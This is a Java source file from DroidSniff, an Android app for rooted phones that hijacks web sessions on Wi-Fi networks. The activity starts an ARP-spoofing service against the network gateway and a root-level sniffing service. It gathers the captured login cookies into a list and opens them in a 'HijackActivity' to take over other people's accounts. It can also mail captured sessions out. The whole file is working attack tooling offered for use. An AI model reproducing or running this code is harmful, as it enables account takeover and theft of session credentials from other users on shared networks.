/*
 * ListenActivity.java is the starting Activity, listening for cookies Copyright
 * (C) 2011 Andreas Koch <koch.trier@gmail.com>
 * 
 * This software was supported by the University of Trier
 * 
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 3 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package com.evozi.droidsniff.controller.activity;

import java.io.Serializable;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import com.actionbarsherlock.app.SherlockActivity;
import com.actionbarsherlock.view.Menu;
import com.actionbarsherlock.view.MenuItem;
import com.actionbarsherlock.view.Window;
import com.evozi.droidsniff.controller.service.ArpspoofService;
import com.evozi.droidsniff.controller.service.DroidsniffService;
import com.evozi.droidsniff.model.*;
import com.evozi.droidsniff.model.auth.Auth;
import com.evozi.droidsniff.model.Constants;
import com.evozi.droidsniff.model.auth.AuthManager;
import com.evozi.droidsniff.view.DialogBuilder;
import com.evozi.droidsniff.model.Executor;
import com.evozi.droidsniff.model.event.AuthEvent;
import com.evozi.droidsniff.model.event.WifiChangeEvent;
import com.evozi.droidsniff.view.SessionListView;
import com.evozi.droidsniff.controller.receiver.WifiChangeReceiver;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.format.Formatter;
import android.util.Log;
import android.view.ContextMenu;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnCreateContextMenuListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.AdapterView.OnItemLongClickListener;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.TextView;
import android.widget.Toast;
import com.evozi.droidsniff.R;
import de.greenrobot.event.EventBus;

public class ListenActivity extends SherlockActivity implements
		OnClickListener, OnItemClickListener, OnItemLongClickListener,
		OnCreateContextMenuListener, OnCheckedChangeListener, Constants {

	private static ArrayList<Auth> authListUnsynchronized = new ArrayList<Auth>();
	public static List<Auth> authList = Collections
			.synchronizedList(authListUnsynchronized);

	private SessionListView sessionListView;
	private TextView tstatus;
	private TextView tnetworkName;
	private CheckBox cbgeneric;

	private int sessionListViewSelected;

	private boolean networkEncryptionWPA = false;
	private String networkName = "";
	private String gatewayIP = "";
	private String localhostIP = "";

	// public static boolean unrooted = false;

	private int lastNotification = 0;
	private NotificationManager mNotificationManager = null;


	public static boolean generic = true;
	private Handler handler = new Handler() {
		@Override
		public synchronized void handleMessage(Message msg) {
			String type = msg.getData().getString(BUNDLE_KEY_TYPE);
			if (type != null && type.equals(BUNDLE_TYPE_WIFICHANGE)) {
				if (!isListening())
					return;
				Toast.makeText(getApplicationContext(),
						getString(R.string.toast_wifi_lost), Toast.LENGTH_SHORT)
						.show();
				stopListening();
				stopSpoofing();
				cleanup();
				updateNetworkSettings();
			} else if (type != null && type.equals(BUNDLE_TYPE_NEWAUTH)) {
				Serializable serializable = msg.getData().getSerializable(
						BUNDLE_KEY_AUTH);
				if (serializable == null || !(serializable instanceof Auth)) {
					Log.e(APPLICATION_TAG,
							"ERROR with serializable. Null or not an instance!");
					return;
				}
				Auth a = (Auth) serializable;
				if (!authList.contains(a)) {
					if (!a.isGeneric()) {
						ListenActivity.authList.add(0, a);
					} else {
						ListenActivity.authList.add(a);
					}
				} else {
					int pos = authList.indexOf(a);
					if (!authList.get(pos).isSaved()) {
						authList.remove(pos);
					}
					authList.add(pos, a);
				}
				ListenActivity.this.refresh();
				ListenActivity.this.notifyUser(false);
			} else if (type != null && type.equals(BUNDLE_TYPE_LOADAUTH)) {
				Serializable serializable = msg.getData().getSerializable(
						BUNDLE_KEY_AUTH);
				if (serializable == null || !(serializable instanceof Auth)) {
					Log.e(APPLICATION_TAG,
							"ERROR with serializable. Null or not an instance!");
					return;
				}
				Auth a = (Auth) serializable;
				if (!authList.contains(a)) {
					ListenActivity.authList.add(0, a);
				}
				ListenActivity.this.refresh();
				ListenActivity.this.notifyUser(false);
			} else if (type != null && type.equals(BUNDLE_TYPE_START)) {
				Button button = (Button) findViewById(R.id.bstartstop);
				button.setEnabled(false);
				if (!isListening() && isSpoofing()) {
					stopSpoofing();
				}

				if (!isListening()) {
					CheckBox cbSpoof = (CheckBox) findViewById(R.id.cbarpspoof);
					if (cbSpoof.isChecked()) {
						startSpoofing();
					} else {
						stopSpoofing();
					}
					startListening();
					notifyUser(true);
					refreshHandler.sleep();
				}
				button.setEnabled(true);
				handler.removeMessages(0);
			} else if (type != null && type.equals(BUNDLE_TYPE_STOP)) {
				stopListening();
				stopSpoofing();
				refreshHandler.stop();
				refresh();
			}
		};
	};

    public void onEventMainThread(WifiChangeEvent wce) {
        if (!isListening())
            return;
        Toast.makeText(getApplicationContext(),
                getString(R.string.toast_wifi_lost), Toast.LENGTH_SHORT)
                .show();
        stopListening();
        stopSpoofing();
        cleanup();
        updateNetworkSettings();
    }

    public void onEventMainThread(AuthEvent ae) {
        switch (ae.getType()) {
            case NEW:
                Auth a = ae.getAuth();
                if (!authList.contains(a)) {
                    if (!a.isGeneric()) {
                        authList.add(0, a);
                    } else {
                        authList.add(a);
                    }
                } else {
                    int pos = authList.indexOf(a);
                    if (!authList.get(pos).isSaved()) {
                        authList.remove(pos);
                    }
                    authList.add(pos, a);
                }
                this.refresh();
                this.notifyUser(false);
                break;
            case LOADED:
                a = ae.getAuth();
                if (!authList.contains(a)) {
                    authList.add(0, a);
                }
                this.refresh();
                this.notifyUser(false);
                break;
        }

    }

	RefreshHandler refreshHandler = new RefreshHandler();

	// private String SpoofURL;
	// private Auth auth;

	class RefreshHandler extends Handler {
		@Override
		public void handleMessage(Message msg) {
			ListenActivity.this.refreshStatus();
			sleep();
		}

		public void sleep() {
			this.removeMessages(0);
			sendMessageDelayed(obtainMessage(0), 1000);
		}

		public void stop() {
			this.removeMessages(0);
		}
	}

	// ############################################################################
	// START LIFECYCLE METHODS
	// ############################################################################

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

        EventBus.getDefault().register(this);

		requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);

		Setup.get().prepareBinaries();

		WifiChangeReceiver wi = new WifiChangeReceiver();
		this.getApplicationContext().registerReceiver(wi,
				new IntentFilter(WifiManager.WIFI_STATE_CHANGED_ACTION));
		if (!Setup.get().checkSu()) {
			DialogBuilder.get().showUnrooted(this);
		}
		if (!Setup.get().checkCommands()) {
			DialogBuilder.get().installBusyBox(this);
		}

		DialogBuilder.get().showDisclaimer(this);

	}

	@Override
	protected void onStart() {
		super.onStart();

		setContentView(R.layout.listen);

		Button button = (Button) findViewById(R.id.bstartstop);

		button.setOnClickListener(this);
		if (isListening()) {
			button.setText(getString(R.string.button_stop));
		} else {
			button.setText(getString(R.string.button_start));
		}
		tstatus = (TextView) findViewById(R.id.status);
		// tnetworkName = (TextView) findViewById(R.id.networkname);
		cbgeneric = (CheckBox) findViewById(R.id.cbgeneric);
		cbgeneric.setOnCheckedChangeListener(this);

		this.sessionListView = ((SessionListView) findViewById(R.id.sessionlist));
		this.sessionListView.setOnItemClickListener(this);
		this.sessionListView.setOnCreateContextMenuListener(this);

		mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		ListenActivity.generic = DB.get().getGeneric();
		cbgeneric.setChecked(ListenActivity.generic);
	}

	@Override
	protected void onResume() {
		super.onResume();
		AuthManager.get().read();
		refresh();
	}

	@Override
	protected void onDestroy() {
		authList.clear();
		mNotificationManager.cancelAll();
		stopListening();
		stopSpoofing();
		finish();
		try {
			cleanup();
		} catch (Exception e) {
			Log.e(APPLICATION_TAG, "Error while onDestroy", e);
		}
		super.onDestroy();
	}

	// ############################################################################
	// END LIFECYCLE METHODS
	// ############################################################################

	// ############################################################################
	// START LISTENER METHODS
	// ############################################################################

	@Override
	public void onItemClick(AdapterView<?> parent, View view, int position,
			long id) {
		if (view == null) {
			return;
		}

		if (sessionListView == null) {
			sessionListView = (SessionListView) findViewById(R.id.sessionlist);
		}

		if (view != null) {
			sessionListViewSelected = position;
			// SpoofURL =
			// ((TextView)view.findViewById(R.id.listtext1)).getText().toString();
			// auth = ListenActivity.authList.get(position);
			try {
				sessionListView.showContextMenuForChild(view);
			} catch (Exception e) {
				// VERY BAD, but actually cant find out how the NPE happens...
				// :-(
				Log.d(APPLICATION_TAG,
						"error on click: " + e.getLocalizedMessage());
			}
		}
	}

	@Override
	public boolean onItemLongClick(AdapterView<?> parent, View view,
			int position, long id) {
		onItemClick(parent, view, position, id);
		return false;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case android.R.id.home:
			Intent i = new Intent(getApplicationContext(), AboutActivity.class);
			startActivity(i);
			return true;
		case MENU_WIFILIST_ID:
			startActivity(new Intent(WifiManager.ACTION_PICK_WIFI_NETWORK));
			break;
		case MENU_CLEAR_SESSIONLIST_ID:
			authList.clear();
			refresh();
			mNotificationManager.cancelAll();
			break;
		case MENU_CLEAR_BLACKLIST_ID:
			DialogBuilder.get().clearBlacklist(this);
			break;
		}
		return false;
	}

	@Override
	public boolean onContextItemSelected(android.view.MenuItem item) {

		Auth a = null;
		switch (item.getItemId()) {
		case ID_MOBILE:
			click(sessionListViewSelected, true);
			break;
		case ID_NORMAL:
			click(sessionListViewSelected, false);
			break;
		case ID_REMOVEFROMLIST:
			authList.remove(sessionListViewSelected);
			refresh();
			break;
		case ID_BLACKLIST:
			a = authList.get(sessionListViewSelected);
            BlackList.get().add(a.getName());
			authList.remove(a);
			refresh();
			break;
		case ID_SAVE:
			a = authList.get(sessionListViewSelected);
			AuthManager.get().save(a);
			refresh();
			break;
		case ID_DELETE:
			a = authList.get(sessionListViewSelected);
			AuthManager.get().delete(a);
			refresh();
			break;
		case ID_EXPORT:
			a = authList.get(sessionListViewSelected);
			MailSender.get().sendAuthByMail(a);
			break;
		/**
		 * case ID_EXTERNAL: clickExternal(sessionListViewSelected, true);
		 * break;
		 **/
		}

		return true;
	}

	@Override
	public void onClick(View v) {
		if (v.getId() == R.id.bstartstop) {
			Message m = handler.obtainMessage();
			Bundle b = new Bundle();
			if (!isListening()) {
				b.putString(BUNDLE_KEY_TYPE, BUNDLE_TYPE_START);
			} else {
				b.putString(BUNDLE_KEY_TYPE, BUNDLE_TYPE_STOP);
			}
			m.setData(b);
			handler.sendMessage(m);
		}
	}

	@Override
	public void onCreateContextMenu(ContextMenu menu, View v,
			ContextMenu.ContextMenuInfo menuInfo) {
		Auth actElem = null;
		if (sessionListViewSelected >= authList.size())
			return;
		actElem = authList.get(sessionListViewSelected);

		menu.setHeaderTitle(getString(R.string.menu_choose_page_title));
		menu.add(ContextMenu.NONE, ID_NORMAL, ContextMenu.NONE,
				getString(R.string.menu_open_normal));
		// menu.add(ContextMenu.NONE, ID_EXTERNAL, ContextMenu.NONE,
		// getString(R.string.menu_open_normal)+" using external browser");
		menu.add(ContextMenu.NONE, ID_REMOVEFROMLIST, ContextMenu.NONE,
				getString(R.string.menu_remove_from_list));
		menu.add(ContextMenu.NONE, ID_BLACKLIST, ContextMenu.NONE,
				getString(R.string.menu_black_list));
		menu.add(ContextMenu.NONE, ID_EXPORT, ContextMenu.NONE,
				getString(R.string.menu_export));

		if (actElem.isSaved()) {
			menu.add(ContextMenu.NONE, ID_DELETE, ContextMenu.NONE,
					getString(R.string.menu_delete));
		} else {
			menu.add(ContextMenu.NONE, ID_SAVE, ContextMenu.NONE,
					getString(R.string.menu_save));
		}

		if (actElem.getMobileUrl() != null) {
			menu.add(ContextMenu.NONE, ID_MOBILE, ContextMenu.NONE,
					getString(R.string.menu_open_mobile));
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		super.onCreateOptionsMenu(menu);
		menu.clear();

		MenuItem menu1 = menu.add(0, MENU_CLEAR_SESSIONLIST_ID, 0,
				getString(R.string.menu_clear_sessionlist));
		menu1.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
		menu1.setIcon(R.drawable.content_discard);

		MenuItem menu2 = menu.add(0, MENU_CLEAR_BLACKLIST_ID, 0,
				getString(R.string.menu_blacklist_clear));
		menu2.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
		menu2.setIcon(R.drawable.content_discard);

		MenuItem menu3 = menu.add(0, MENU_WIFILIST_ID, 0,
				getString(R.string.menu_wifilist));
		menu3.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
		menu3.setIcon(R.drawable.ab_device_access_network_wifi);

		MenuItem menu4 = menu.add(0, MENU_DEBUG_ID, 0,
				getString(R.string.menu_debug));
		menu4.setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);

		return true;
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			AlertDialog.Builder builder = new AlertDialog.Builder(this);
			builder.setTitle("Do you really want to exit DroidSniff?");
			builder.setMessage(R.string.popup_exit)
					.setPositiveButton(R.string.button_ok,
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
										int id) {
									ListenActivity.this.finish();
								}
							})
					.setNegativeButton(R.string.button_no,
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
										int id) {
									dialog.cancel();
								}
							});
			AlertDialog alert = builder.create();
			alert.show();
		}
		return super.onKeyDown(keyCode, event);
	}

	@Override
	public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
		if (buttonView.equals(cbgeneric)) {
			ListenActivity.generic = isChecked;
			DB.get().setGeneric(isChecked);
		}
	}

	// ############################################################################
	// END LISTENER METHODS
	// ############################################################################

	private void startSpoofing() {
		WifiManager wManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
		WifiInfo wInfo = wManager.getConnectionInfo();

		// Check to see if we're connected to wifi
		int localhost = wInfo.getIpAddress();

		if (localhost != 0) {
			wManager.getConnectionInfo();
			gatewayIP = Formatter
					.formatIpAddress(wManager.getDhcpInfo().gateway);
			localhostIP = Formatter.formatIpAddress(localhost);

			// If nothing was entered for the ip address use the gateway
			if (gatewayIP.trim().equals(""))
				gatewayIP = Formatter
						.formatIpAddress(wManager.getDhcpInfo().gateway);

			// determining wifi network interface
			InetAddress localInet;
			String interfaceName = null;
			try {
				localInet = InetAddress.getByName(localhostIP);
				NetworkInterface wifiInterface = NetworkInterface
						.getByInetAddress(localInet);
				interfaceName = wifiInterface.getDisplayName();

			} catch (UnknownHostException e) {
				Log.e(APPLICATION_TAG, "error getting localhost's InetAddress",
						e);
			} catch (SocketException e) {
				Log.e(APPLICATION_TAG, "error getting wifi network interface",
						e);
			}

			Intent intent = new Intent(this, ArpspoofService.class);
			Bundle mBundle = new Bundle();
			mBundle.putString("gateway", gatewayIP);
			mBundle.putString("localBin", Setup.get().getBinaryPath("arpspoof"));
			mBundle.putString("interface", interfaceName);
			intent.putExtras(mBundle);

			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
			}
			startService(intent);
		} else {
			Toast.makeText(getApplicationContext(),
					"Must be connected to wireless network.", Toast.LENGTH_LONG)
					.show();
		}
	}

	public void stopSpoofing() {
		Intent intent = new Intent(this, ArpspoofService.class);
		stopService(intent);
		try {
			Thread.sleep(200);
		} catch (InterruptedException e) {
		}
	}

	public void stopListening() {
		Intent intent = new Intent(this, DroidsniffService.class);
		stopService(intent);
		try {
			Thread.sleep(200);
		} catch (InterruptedException e) {
		}
	}

	private boolean isSpoofing() {
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager
				.getRunningServices(Integer.MAX_VALUE)) {
			if (ArpspoofService.class.getName().equals(
					service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}

	private boolean isListening() {
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager
				.getRunningServices(Integer.MAX_VALUE)) {
			if (DroidsniffService.class.getName().equals(
					service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}

	public void click(int id, boolean mobilePage) {
		if (authList.isEmpty()) {
			Toast.makeText(this.getApplicationContext(),
					"No Auth available...", Toast.LENGTH_SHORT).show();
			return;
		}
		Auth a = null;
		if (id < authList.size() && authList.get(id) != null) {
			a = authList.get(id);
		} else {
			return;
		}

        HijackActivity.start(
                this,
                HijackActivity.Args.of(a, mobilePage));
	}

	private void startListening() {
		Executor.get().execSUCommand(CLEANUP_COMMAND_DROIDSNIFF);
		updateNetworkSettings();

		if (networkEncryptionWPA && !isSpoofing()) {
			Toast.makeText(
					this.getApplicationContext(),
					"This network is WPA encrypted. Without ARP-Spoofing you won't find sessions...!",
					Toast.LENGTH_LONG).show();
		}

		Button bstartstop = (Button) findViewById(R.id.bstartstop);

		if (!isListening()) {
			Intent intent = new Intent(this, DroidsniffService.class);
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
			}
			startService(intent);
			bstartstop.setText("Stop");
		} else {
			Toast t = Toast.makeText(this.getApplicationContext(),
					getString(R.string.toast_process_running_text),
					Toast.LENGTH_SHORT);
			t.show();
		}
		refresh();
	}

	private void cleanup() {
		tstatus.setText(getString(R.string.label_not_running));
		tstatus.setTextColor(Color.YELLOW);
		setSupportProgressBarIndeterminateVisibility(false);
		Button button = ((Button) findViewById(R.id.bstartstop));
		button.setText("Start");
		stopSpoofing();
		stopListening();
		Executor.get().execNewSUCommand(CLEANUP_COMMAND_ARPSPOOF);
		Executor.get().execNewSUCommand(CLEANUP_COMMAND_DROIDSNIFF);
	}

	private void refresh() {
		boolean listening = isListening();

		refreshStatus();

		Button bstartstop = (Button) findViewById(R.id.bstartstop);
		if (listening) {
    		bstartstop.setText("Stop");
		} else {
			bstartstop.setText("Start");
			mNotificationManager.cancelAll();
			refreshHandler.stop();
		}

		updateNetworkSettings();
		sessionListView.refresh();
	}

	public void refreshStatus() {
		boolean listening = isListening();
		boolean spoofing = isSpoofing();

		if (listening && !spoofing) {
			tstatus.setText(getString(R.string.label_running));
			tstatus.setTextColor(Color.GREEN);
			tstatus.setTextSize(15);
			setSupportProgressBarIndeterminateVisibility(true);
		} else if (listening && spoofing) {
			tstatus.setText(getString(R.string.label_running_and_spoofing));
			tstatus.setTextColor(Color.GREEN);
			tstatus.setTextSize(15);
			setSupportProgressBarIndeterminateVisibility(true);
		} else if (!listening && spoofing) {
			tstatus.setText(getString(R.string.label_not_running_and_spoofing));
			tstatus.setTextColor(Color.YELLOW);
			tstatus.setTextSize(15);
			setSupportProgressBarIndeterminateVisibility(false);
		} else {
			tstatus.setText(getString(R.string.label_not_running));
			tstatus.setTextColor(Color.YELLOW);
			tstatus.setTextSize(15);
			setSupportProgressBarIndeterminateVisibility(false);
		}

	}

	private void updateNetworkSettings() {
		WifiManager wm = (WifiManager) getApplicationContext()
				.getSystemService(WIFI_SERVICE);
		WifiInfo wifiInfo = wm.getConnectionInfo();

		if (wifiInfo == null) {
			networkEncryptionWPA = false;
			networkName = "- None -";
			tnetworkName.setText(getString(R.string.label_networkname_pref)
					+ networkName.toUpperCase());
		} else {
			networkName = wifiInfo.getSSID() != null ? " " + wifiInfo.getSSID()
					: null;
			getSupportActionBar().setSubtitle(networkName);
			// tnetworkName.setText(getString(R.string.label_networkname_pref) +
			// networkName.toUpperCase());
		}
		TextView tspoof = (TextView) findViewById(R.id.spoofaddress);
		if (isSpoofing()) {
			tspoof.setText("Spoofing IP: " + gatewayIP);
		} else {
			tspoof.setText("Not spoofing any IP");
		}
	}

	private void notifyUser(boolean persistent) {
		if (lastNotification >= authList.size())
			return;
		lastNotification = authList.size();

		int icon = R.drawable.ic_stat_session;
		long when = java.lang.System.currentTimeMillis();
		Notification notification = new Notification(icon,
				getString(R.string.notification_title), when);

		Context context = getApplicationContext();
		Intent notificationIntent = new Intent(ListenActivity.this,
				ListenActivity.class);
		PendingIntent contentIntent = PendingIntent.getActivity(this, 0,
				notificationIntent, 0);

		if (persistent = true) {
			notification.setLatestEventInfo(context,
					"DroidSniff is listening for sessions",
					getString(R.string.notification_text), contentIntent);
		} else {
			notification.setLatestEventInfo(context,
					getString(R.string.notification_title),
					getString(R.string.notification_text), contentIntent);
		}
		mNotificationManager.notify(NOTIFICATION_ID, notification);
	}
}